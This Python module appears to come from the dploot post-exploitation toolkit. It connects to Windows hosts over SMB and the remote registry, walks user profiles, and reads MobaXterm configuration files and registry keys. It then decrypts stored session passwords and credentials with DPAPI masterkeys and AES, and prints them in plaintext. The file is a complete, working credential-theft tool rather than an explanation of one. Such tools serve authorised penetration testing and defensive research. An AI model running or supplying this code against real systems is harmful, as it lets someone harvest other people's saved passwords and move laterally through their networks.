from base64 import b64decode
import logging
import ntpath
import os
import tempfile
from typing import Any, Dict, List, Tuple, Optional
from Cryptodome.Cipher import AES

from impacket import winregistry
from impacket.dcerpc.v5 import rrp
from impacket.system_errors import ERROR_NO_MORE_ITEMS, ERROR_FILE_NOT_FOUND

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey
from dataclasses import dataclass


@dataclass
class MobaXtermPassword:
    winuser: str
    username: str
    password_encrypted: bytes
    password: bytes = None

    def decrypt(self, masterpassword_key):
        iv = AES.new(key=masterpassword_key, mode=AES.MODE_ECB).encrypt(
            b"\x00" * AES.block_size
        )
        cipher = AES.new(
            key=masterpassword_key, iv=iv, mode=AES.MODE_CFB, segment_size=8
        )
        self.password = cipher.decrypt(b64decode(self.password_encrypted))

    def dump(self) -> None:
        print("[MOBAXTERM PASSWORD]")
        print("Username:\t%s" % self.username)
        if self.password is not None:
            print("Password:\t%s" % self.password.decode("latin-1"))
        print()

    def dump_quiet(self) -> None:
        print(f"[MOBAXTERM PASSWORD] {self.username}:{self.password}")


@dataclass
class MobaXtermCredential:
    winuser: str
    name: str
    username: str
    password_encrypted: bytes
    password: bytes = None

    def decrypt(self, masterpassword_key):
        iv = AES.new(key=masterpassword_key, mode=AES.MODE_ECB).encrypt(
            b"\x00" * AES.block_size
        )
        cipher = AES.new(
            key=masterpassword_key, iv=iv, mode=AES.MODE_CFB, segment_size=8
        )
        self.password = cipher.decrypt(b64decode(self.password_encrypted))

    def dump(self) -> None:
        print("[MOBAXTERM CREDENTIAL]")
        print("Name:\t\t%s" % self.name)
        print("Username:\t%s" % self.username)
        if self.password is not None:
            print("Password:\t%s" % self.password.decode("latin-1"))
        print()

    def dump_quiet(self) -> None:
        print(
            f"[MOBAXTERM CREDENTIAL] {self.name} - {self.username}:{self.password}"
        )


@dataclass
class MobaXtermMasterPassword:
    winuser: str
    username: str
    host: str
    entropy: bytes
    masterpassword_raw_value: bytes
    masterpassword_decrypted: bytes = None
    _key: bytes = None

    def decrypt_masterpassword_raw_value(self, masterkeys):
        dpapi_blob = bytes.fromhex(
            "01000000d08c9ddf0115d1118c7a00c04fc297eb"
        ) + b64decode(self.masterpassword_raw_value)
        masterkey = find_masterkey_for_blob(dpapi_blob, masterkeys)
        if masterkey is not None:
            self.masterpassword_decrypted = decrypt_blob(
                blob_bytes=dpapi_blob, masterkey=masterkey, entropy=self.entropy
            )

    @property
    def key(self):
        if self._key is not None:
            return self._key
        if self.masterpassword_decrypted is None:
            return self.masterpassword_decrypted

        self._key = b64decode(self.masterpassword_decrypted)[0:32]
        return self._key

    def dump(self) -> None:
        print("[MOBAXTERM MASTERPASSWORD KEY]")
        print("Host:\t\t\t%s" % self.host)
        print("Username:\t\t%s" % self.username)
        if self.masterpassword_decrypted is not None:
            print(
                "MasterPassword Key:\t%s"
                % b64decode(self.masterpassword_decrypted).hex()
            )
        print()

    def dump_quiet(self) -> None:
        print(
            f"[MOBAXTERM MASTERPASSWORD KEY] {self.host} - {self.username} - {b64decode(self.masterpassword_decrypted).hex()}"
        )


class MobaXtermTriage:
    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    
    mobaxterm_conf_file_path = "Users\\{username}\\AppData\\Roaming\\MobaXterm\\MobaXterm.ini"
    mobaxterm_registry_key_path = "SOFTWARE\\Mobatek\\MobaXterm"
    mobaxterm_sessionp_key_path = ntpath.join(mobaxterm_registry_key_path, "SessionP")
    mobaxterm_masterpassword_registry_key = "M"
    mobaxterm_passwords_registry_key = "P"
    mobaxterm_credentials_registry_key = "C"

    ntuser_dat_path = "Users\\{username}\\NTUSER.DAT"
    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_secret_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn
        self.looted_files = {}

        self._users = None
        self.masterkeys = masterkeys

        self.per_secret_callback = per_secret_callback

    def triage_mobaxterm(
        self, offline_users: bool = False
    ) -> Tuple[
        List[MobaXtermMasterPassword], List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        logging.getLogger("impacket").disabled = True
        mobaxterm_credentials = []
        mobaxterm_masterpassword_key = []
        for user, sid in self.users.items():
            try:
                masterpassword_key, credentials = self.triage_mobaxterm_for_user(
                    user, sid, offline_users
                )
                if masterpassword_key is not None:
                    mobaxterm_credentials += credentials
                    mobaxterm_masterpassword_key.append(masterpassword_key)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return mobaxterm_masterpassword_key, mobaxterm_credentials

    def triage_mobaxterm_for_user(
        self, user: str, sid: Optional[str] = None, offline_users: bool = False
    ) -> Tuple[
        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        mobaxterm_masterpassword = None
        mobaxterm_credentials = []

        mobaxterm_masterpassword, mobaxterm_credentials = self.extract_mobaxtermkeys_for_user_from_files(user, sid)
        if not self.conn.local_session and (mobaxterm_masterpassword is None or len(mobaxterm_credentials) == 0):

            logging.debug(f"Triaging MobaXterm for user {user}")
            mobaxterm_masterpassword, mobaxterm_credentials = (
                self.extract_mobaxtermkeys_for_user_from_remote_registry(user, sid)
            )

        if mobaxterm_masterpassword is None and offline_users:
            try:
                ntuser_dat_bytes = (
                    self.conn.readFile(
                        self.share, self.ntuser_dat_path.format(username=user), looted_files=self.looted_files
                    )
                    if offline_users
                    else None
                )
            except Exception as e:
                import traceback

                traceback.print_exc()
                logging.error(e)

            # Preparing NTUSER.DAT file
            fh = tempfile.NamedTemporaryFile()
            fh.write(ntuser_dat_bytes)
            fh.seek(0)
            # Extracting everything

            mobaxterm_masterpassword, mobaxterm_credentials = (
                self.extract_mobaxtermkeys_for_user_from_ntuser_dat(fh.name, user)
            )

        return mobaxterm_masterpassword, mobaxterm_credentials

    def extract_mobaxtermkeys_for_user_from_ntuser_dat(
        self, ntuser_dat_filename: str, user: str
    ) -> Tuple[
        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        reg = winregistry.Registry(ntuser_dat_filename, isRemote=False)
        parent_key = reg.findKey(self.mobaxterm_registry_key_path)
        if parent_key is None:
            # MobaXterm is not installed for this user
            return None, []
        logging.debug(f"Found MobaXterm registry keys for user {user}")

        mobaxterm_masterpassword_key = None
        mobaxterm_credentials = []

        try:
            entropy = reg.getValue(self.mobaxterm_sessionp_key_path)[1]
            entropy = entropy.decode("utf-16le").rstrip("\0").encode()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))

        try:
            key_path = ntpath.join(
                self.mobaxterm_registry_key_path,
                self.mobaxterm_masterpassword_registry_key,
            )
            new_key = reg.findKey(key_path)
            values = reg.enumValues(new_key)
            data = reg.getValue(ntpath.join(key_path, values[-1].decode("utf-8")))
            username, host = values[-1].decode("utf-8").split("@")
            mobaxterm_masterpassword_key = MobaXtermMasterPassword(
                winuser=user,
                username=username,
                host=host,
                entropy=entropy,
                masterpassword_raw_value=data[1],
            )
            mobaxterm_masterpassword_key.decrypt_masterpassword_raw_value(
                masterkeys=self.masterkeys
            )
            logging.debug(f"Found Mobaxterm MasterPassword for user {user}")
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
        if mobaxterm_masterpassword_key.key is None:
            return mobaxterm_masterpassword_key, mobaxterm_credentials
        try:
            key_path = ntpath.join(
                self.mobaxterm_registry_key_path,
                self.mobaxterm_credentials_registry_key,
            )
            key = reg.findKey(key_path)
            values = reg.enumValues(key)
            logging.debug(f"Found {len(values)} Mobaxterm Credentials for user {user}")
            for value in values:
                _, data = reg.getValue(ntpath.join(key_path, value.decode("latin-1")))
                username, password_encrypted = data.split(b":")
                mobaxterm_credential = MobaXtermCredential(
                    winuser=user,
                    name=value.decode("latin-1"),
                    username=username.decode("utf-16le", errors="backslashreplace"),
                    password_encrypted=password_encrypted,
                )
                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
                mobaxterm_credentials.append(mobaxterm_credential)
                if self.per_secret_callback is not None:
                    self.per_secret_callback(mobaxterm_credential)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))

        try:
            key_path = ntpath.join(
                self.mobaxterm_registry_key_path, self.mobaxterm_passwords_registry_key
            )
            key = reg.findKey(key_path)
            values = reg.enumValues(key)
            logging.debug(f"Found {len(values)} Mobaxterm Passwords for user {user}")
            for value in values:
                data = reg.getValue(ntpath.join(key_path, value.decode("utf-8")))
                mobaxterm_credential = MobaXtermPassword(
                    winuser=user,
                    username=value.decode("latin-1"),
                    password_encrypted=data[-1].decode("latin-1"),
                )
                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
                mobaxterm_credentials.append(mobaxterm_credential)
                if self.per_secret_callback is not None:
                    self.per_secret_callback(mobaxterm_credential)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
        return mobaxterm_masterpassword_key, mobaxterm_credentials

    def extract_entropy_for_user(self, user: str, sid: str):
        # Extract entropy
        entropy = None
        ans = rrp.hOpenUsers(self.conn.remote_ops._RemoteOperations__rrp)
        regHandle = ans["phKey"]
        regKey = ntpath.join(sid, self.mobaxterm_registry_key_path)
        keyHandle = None
        try:
            ans2 = rrp.hBaseRegOpenKey(
                self.conn.remote_ops._RemoteOperations__rrp,
                regHandle,
                regKey,
                samDesired=rrp.MAXIMUM_ALLOWED
                | rrp.KEY_ENUMERATE_SUB_KEYS
                | rrp.KEY_QUERY_VALUE,
            )
            keyHandle = ans2["phkResult"]
            _, entropy = rrp.hBaseRegQueryValue(
                self.conn.remote_ops._RemoteOperations__rrp, keyHandle, "SessionP"
            )
            entropy = entropy.rstrip("\00").encode("utf-8")
            rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
        except rrp.DCERPCSessionError as e:
            if e.get_error_code() == ERROR_FILE_NOT_FOUND:
                logging.debug(
                    f"ERROR_FILE_NOT_FOUND while querying for user {user} on HKU: must be offline"
                )
            else:
                import traceback

                traceback.print_exc()
                logging.error(f"Error while hBaseRegOpenKey HKU\\{regKey}: {e}")
        return entropy

    def extract_mobaxtermkeys_for_user_from_files(self, user: str, sid: str) -> Tuple[
        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        self.conn.enable_remoteops()

        mobaxterm_masterpassword_key = None
        mobaxterm_credentials = []

        # Extract entropy
        entropy = self.extract_entropy_for_user(user, sid)
        if entropy is None:
            return None, []
        
        # Extract all
        try:
            conf_file = self.conn.readFile(
                self.share, self.mobaxterm_conf_file_path.format(username=user), looted_files=self.looted_files
            )
            dpapi_blob = conf_file.split(b"[Sesspass]\r\n")[1].split(b"\r\n")[0].split(b"=",1)[1]
            mobaxterm_masterpassword_key = MobaXtermMasterPassword(
                winuser=user,
                entropy=entropy,
                host="",
                username="",
                masterpassword_raw_value=dpapi_blob
            )
            
            mobaxterm_masterpassword_key.decrypt_masterpassword_raw_value(
                masterkeys=self.masterkeys
            )

            logging.debug(f"Found Mobaxterm MasterPassword for user {user}")

            credentials = conf_file.split(b"[Credentials]\r\n")[1].split(b"\r\n\r\n")[0]
            for credential in credentials.split(b"\r\n"):
                name, username = credential.decode().split("=",1)
                username, password_encrypted = username.split(":",1)
                mobaxterm_credential = MobaXtermCredential(
                    winuser=user,
                    name=name,
                    username=username,
                    password_encrypted=password_encrypted,
                )
                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
                mobaxterm_credentials.append(mobaxterm_credential)
                if self.per_secret_callback is not None:
                    self.per_secret_callback(mobaxterm_credential)

            passwords = conf_file.split(b"[Passwords]\r\n")[1].split(b"\r\n\r\n")[0]
            for password in passwords.split(b"\r\n"):
                username, encrypted_pass = password.decode().split("=",1)
                mobaxterm_credential = MobaXtermPassword(
                    winuser=user, username=username, password_encrypted=encrypted_pass
                )
                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
                mobaxterm_credentials.append(mobaxterm_credential)
                if self.per_secret_callback is not None:
                    self.per_secret_callback(mobaxterm_credential)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
            logging.debug(str(e))
        return mobaxterm_masterpassword_key, mobaxterm_credentials

    def extract_mobaxtermkeys_for_user_from_remote_registry(
        self, user: str, sid: str
    ) -> Tuple[
        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        self.conn.enable_remoteops()

        mobaxterm_masterpassword_key = None
        mobaxterm_credentials = []

        # Extract entropy
        entropy = self.extract_entropy_for_user(user, sid)
        if entropy is None:
            return None, []
        
        ans = rrp.hOpenUsers(self.conn.remote_ops._RemoteOperations__rrp)
        regHandle = ans["phKey"]
        regKey = ntpath.join(sid, self.mobaxterm_registry_key_path)

        # Extract M
        try:
            ans2 = rrp.hBaseRegOpenKey(
                self.conn.remote_ops._RemoteOperations__rrp,
                regHandle,
                ntpath.join(regKey, self.mobaxterm_masterpassword_registry_key),
                samDesired=rrp.MAXIMUM_ALLOWED
                | rrp.KEY_ENUMERATE_SUB_KEYS
                | rrp.KEY_QUERY_VALUE,
            )
            keyHandle = ans2["phkResult"]
            value = rrp.hBaseRegEnumValue(
                self.conn.remote_ops._RemoteOperations__rrp, keyHandle, 0
            )
            name, host = value["lpValueNameOut"].split("@")
            mobaxterm_masterpassword_key = MobaXtermMasterPassword(
                winuser=user,
                entropy=entropy,
                host=host,
                username=name,
                masterpassword_raw_value=b"".join(value["lpData"]),
            )
            mobaxterm_masterpassword_key.decrypt_masterpassword_raw_value(
                masterkeys=self.masterkeys
            )
            logging.debug(f"Found Mobaxterm MasterPassword for user {user}")
            rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
        except rrp.DCERPCSessionError as e:
            # try extract with file
            if e.get_error_code() == ERROR_FILE_NOT_FOUND:
                try:
                    conf_file = self.conn.readFile(
                                self.share, self.mobaxterm_conf_file_path.format(username=user), looted_files=self.looted_files
                            )
                    dpapi_blob = conf_file.split(b"[Sesspass]\r\n")[1].split(b"\r\n")[0].split(b"=",1)[1]
                    mobaxterm_masterpassword_key = MobaXtermMasterPassword(
                        winuser=user,
                        entropy=entropy,
                        host="",
                        username="",
                        masterpassword_raw_value=dpapi_blob
                    )
                    
                    mobaxterm_masterpassword_key.decrypt_masterpassword_raw_value(
                        masterkeys=self.masterkeys
                    )

                    logging.debug(f"Found Mobaxterm MasterPassword for user {user}")
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback

                        traceback.print_exc()
                    logging.debug(str(e))
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
        if mobaxterm_masterpassword_key is None:
            return None, []
        # Extract C and P
        for key in [
            self.mobaxterm_credentials_registry_key,
            self.mobaxterm_passwords_registry_key,
        ]:
            ans2 = rrp.hBaseRegOpenKey(
                self.conn.remote_ops._RemoteOperations__rrp,
                regHandle,
                ntpath.join(regKey, key),
                samDesired=rrp.MAXIMUM_ALLOWED
                | rrp.KEY_ENUMERATE_SUB_KEYS
                | rrp.KEY_QUERY_VALUE,
            )
            keyHandle = ans2["phkResult"]
            i = 0
            while True:
                try:
                    value = rrp.hBaseRegEnumValue(
                        self.conn.remote_ops._RemoteOperations__rrp, keyHandle, i
                    )
                    data = b"".join(value["lpData"])
                    name = value["lpValueNameOut"].rstrip("\00")
                    if b":" in data:
                        username, password_encrypted = data.split(b":")
                        mobaxterm_credential = MobaXtermCredential(
                            winuser=user,
                            name=name,
                            username=username.decode(
                                "utf-16le", errors="backslashreplace"
                            ),
                            password_encrypted=password_encrypted,
                        )
                    else:
                        mobaxterm_credential = MobaXtermPassword(
                            winuser=user, username=name, password_encrypted=data
                        )
                    mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
                    mobaxterm_credentials.append(mobaxterm_credential)
                    i += 1
                    if self.per_secret_callback is not None:
                        self.per_secret_callback(mobaxterm_credential)
                except rrp.DCERPCSessionError as e:
                    if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                        break
        return mobaxterm_masterpassword_key, mobaxterm_credentials

    @property
    def users(self) -> Dict[str, str]:
        """Returns dict of username: sid"""
        if self._users is not None:
            return self._users

        users = {}
        sids = []
        userlist_key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"

        if self.conn.local_session:
            reg = winregistry.Registry(
                os.path.join(
                    self.conn.target.local_root, r"Windows/System32/config/SOFTWARE"
                ),
                isRemote=False,
            )
            parentKey = reg.findKey(userlist_key[8:])
            if parentKey is None:
                self._users = users
                reg.close()
                return self._users

            sids = list(reg.enumKey(parentKey))

            for sid in sids:
                (v_type, v_data) = reg.getValue(
                    ntpath.join(userlist_key[8:], sid, "ProfileImagePath")
                )
                profile_path = v_data.decode("utf-16le").rstrip("\0")
                if r"%systemroot%" in profile_path:
                    continue
                users[ntpath.basename(profile_path)] = sid

            reg.close()

        else:
            self.conn.enable_remoteops()
            ans = rrp.hOpenLocalMachine(self.conn.remote_ops._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(
                self.conn.remote_ops._RemoteOperations__rrp,
                regHandle,
                userlist_key,
                samDesired=rrp.MAXIMUM_ALLOWED
                | rrp.KEY_ENUMERATE_SUB_KEYS
                | rrp.KEY_QUERY_VALUE,
            )
            keyHandle = ans["phkResult"]

            i = 0
            while True:
                try:
                    ans2 = rrp.hBaseRegEnumKey(
                        self.conn.remote_ops._RemoteOperations__rrp, keyHandle, i
                    )
                    sids.append(ans2["lpNameOut"])
                except rrp.DCERPCSessionError as e:
                    if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                        break
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback

                        traceback.print_exc()
                    logging.error(e)
                i += 1
            rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
            for sid in sids:
                ans = rrp.hBaseRegOpenKey(
                    self.conn.remote_ops._RemoteOperations__rrp,
                    regHandle,
                    ntpath.join(userlist_key, sid),
                    samDesired=rrp.MAXIMUM_ALLOWED
                    | rrp.KEY_ENUMERATE_SUB_KEYS
                    | rrp.KEY_QUERY_VALUE,
                )
                keyHandle = ans["phkResult"]
                _, profile_path = rrp.hBaseRegQueryValue(
                    self.conn.remote_ops._RemoteOperations__rrp,
                    keyHandle,
                    "ProfileImagePath",
                )
                if r"%systemroot%" in profile_path:
                    continue
                users[ntpath.basename(profile_path.rstrip("\0"))] = sid.rstrip("\0")
                rrp.hBaseRegCloseKey(
                    self.conn.remote_ops._RemoteOperations__rrp, keyHandle
                )

        self._users = users
        return self._users
